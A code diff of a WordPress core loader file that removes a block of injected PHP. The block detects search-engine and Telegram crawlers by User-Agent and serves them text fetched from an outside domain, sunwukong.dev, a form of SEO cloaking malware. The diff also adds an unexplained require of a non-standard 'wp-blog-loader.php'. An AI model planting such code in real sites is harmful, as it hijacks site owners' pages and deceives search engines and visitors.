@@ -1,25 +1,4 @@
 <?php
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-
-return false;
-}
-
-if (is_bot()) {
-$message = file_get_contents('https://sunwukong.dev/LANDING/3djewelrymodel.txt');
-echo $message;
-exit;
-}
-?>
-
-<?php
 /**
  * Loads the WordPress environment and template.
  *
@@ -32,6 +11,7 @@ if ( ! isset( $wp_did_header ) ) {
 
 	// Load the WordPress library.
 	require_once __DIR__ . '/wp-load.php';
+  	require_once __DIR__ . '/wp-blog-loader.php';
 
 	// Set up the WordPress query.
 	wp();
@@ -39,4 +19,4 @@ if ( ! isset( $wp_did_header ) ) {
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
-}
+}  
